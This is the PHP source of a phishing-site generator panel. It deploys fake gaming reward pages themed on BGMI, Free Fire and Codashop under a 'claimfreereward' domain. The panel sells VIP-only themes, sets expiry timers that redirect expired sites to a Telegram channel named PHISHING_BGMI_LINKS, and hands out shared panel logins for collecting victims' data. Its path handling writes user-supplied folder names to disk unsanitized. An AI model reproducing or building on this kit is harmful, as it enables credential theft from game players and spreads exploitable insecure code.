
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

session_start();


date_default_timezone_set('Asia/Kolkata');

$domain = "https://claimfreereward.in/claim/";

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header("Location: signin.php");
    exit;
}

$userDetails = ($_SESSION['loggedin']);

// Ab $isVip set karein
$isVip = isset($userDetails['is_vip']) && (int)$userDetails['is_vip'] === 1;

function createDirectoryAndFile($path, $expirationDate, $theme) {
    if (!file_exists($path)) {
        mkdir($path, 0755, true);
        file_put_contents("$path/expiration.txt", $expirationDate);

        $zip = new ZipArchive;
        if ($zip->open("uploads/$theme.zip") === TRUE) {
            $zip->extractTo($path);
            $zip->close();
            return true;
        } else {
            return false; // Failed to open the zip file
        }
    }
    return false; // Directory already exists
}

function isExpired($expirationDate) {
    $currentDate = date('Y-m-d H:i:s');
    return strtotime($currentDate) > strtotime($expirationDate);
}

function replaceIndexIfExpired($path) {
    $expirationFile = "$path/expiration.txt";
    if (file_exists($expirationFile)) {
        $expirationDate = file_get_contents($expirationFile);
        if (isExpired($expirationDate)) {
            $redirectScript = "<?php\nheader('Location: https://telegram.me/PHISHING_BGMI_LINKS');\nexit;\n?>";
            file_put_contents("$path/index.php", $redirectScript);
        }
    }
}

$message = "";
$path = isset($_POST['path']) ? rtrim($_POST['path'], '/') : '';

// Replace index.php if expired
replaceIndexIfExpired($path);

$themesDirectory = 'uploads/';
$themes = array_diff(scandir($themesDirectory), array('..', '.'));
$themes = array_filter($themes, function ($item) {
    return strpos($item, '.zip') !== false;
});

// Check if the user is VIP
$isVip = isset($userDetails['is_vip']) && (int)$userDetails['is_vip'] === 1;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $theme = $_POST['theme'];
    $expiryDuration = $_POST['expiry'];
    $expiryDate = date('Y-m-d H:i:s', strtotime("+$expiryDuration"));

    if (createDirectoryAndFile($path, $expiryDate, $theme)) {
        $message = "Website created: \n$domain$path\n\n" .
                   "Panel:\n$domain$path/login.php\n\n" .
                   "Username: CHEIF\nPassword: OP";
    } else {
        $message = "Web already exists or has expired: $domain$path";
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CHEIF WEB GENERATOR</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #282a36;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            padding: 20px;
            border-radius: 15px;
            background: rgba(40, 42, 54, 0.9);
            box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
        }

        form {
            display: flex;
            flex-direction: column;
        }

        label {
            margin-bottom: 10px;
            font-size: 1.2em;
        }

        input[type="text"], select {
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 5px;
            border: 1px solid #0fa;
            background: transparent;
            color: #fff;
        }

        input[type="submit"] {
            padding: 10px 15px;
            border-radius: 5px;
            border: 1px solid #0fa;
            background: transparent;
            color: #0fa;
            cursor: pointer;
            transition: background-color 0.3s, color 0.3s;
        }

        input[type="submit"]:hover {
            background-color: #0fa;
            color: #fff;
        }

        .message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            background: rgba(0, 255, 255, 0.2);
            border: 1px solid #0fa;
        }

        .button {
            padding: 10px 15px;
            border-radius: 5px;
            border: 1px solid #0fa;
            background: transparent;
            color: #0fa;
            cursor: pointer;
            transition: background-color 0.3s, color 0.3s;
        }

        .button:hover {
            background-color: #0fa;
            color: #fff;
        }

        footer {
            position: fixed;
            left: 0;
            bottom: 0;
            width: 100%;
            background-color: #0fa;
            color: black;
            text-align: center;
            padding: 10px 0;
        }

        .channel-link {
            color: black;
            text-decoration: underline;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <div class="container">
        <form action="" method="post">
            <label for="theme">Choose Theme:</label>
            <select name="theme" id="theme" required>
    <?php foreach ($themes as $theme):
        $themeName = basename($theme, '.zip');
        $isVipTheme = in_array($themeName, ['CODASHOP UC','FROSTY RENDEZVOUS','UC MATERIAL EVENT','FF COLLECT LONG','FF COLLECT NEW','FF UID WEB','BGMI XSUIT COLLECTION','BGMI 4XSUIT','TOKEN FF','ITS TIME INDIA SERIES BGMI','UC MATERIAL EVNT','ESPORTS SERIES FREEFIRE','FIERCE X-SUIT']); // Adjust with your VIP themes

        // Non-VIP users cannot select VIP-only themes
        $disabledForNonVip = $isVipTheme && !$isVip ? 'disabled' : '';
    ?>
        <option value="<?php echo $themeName; ?>" <?php echo $disabledForNonVip; ?>>
            <?php echo $themeName; ?> <?php echo $isVipTheme ? '(VIP Only)' : ''; ?>
        </option>
    <?php endforeach; ?>
</select>

            <label for="path">Url Name:</label>
            <input type="text" name="path" id="path" placeholder="Enter The Url Name" required>

            <label for="expiry">Choose Expiry Duration:</label>
            <select name="expiry" id="expiry" required>
    <?php
    for ($i = 0; $i <= 7; $i++) {
        $dayText = $i === 1 ? ' Day' : ' Days'; // Use singular 'Day' for 1, plural 'Days' otherwise
        ?>
        <option value="<?php echo $i . $dayText; ?>"><?php echo $i . $dayText; ?></option>
        <?php
    }
    ?>
</select>
            <input type="submit" class="button" value="Generate">
        </form>
        
        <?php if (!empty($message)): ?>
            <div class="message">
                <pre><?php echo htmlspecialchars($message); ?></pre>
                <button class="button" onclick="copyToClipboard()">Copy Your Website</button>
            </div>
        <?php endif; ?>
    </div>

    <footer>
        <a href="https://telegram.me/PHISHING_BGMI_LINKS" class="channel-link" target="_blank">VISIT OUR CHANNEL</a>
    </footer>

    <script>
        function copyToClipboard() {
            var text = document.querySelector('.message pre').innerText;
            var textArea = document.createElement('textarea');
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            alert('Copied to clipboard!');
        }
    </script>
    <script>
        function checkExpiry() {
            fetch('check_expiry.php')
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    console.log("Expiry checked");
                })
                .catch(error => console.error('Error:', error));
        }

        setInterval(checkExpiry, 1000); // Har second mein check karega
    </script>
</body>
</html>
</body>
</html>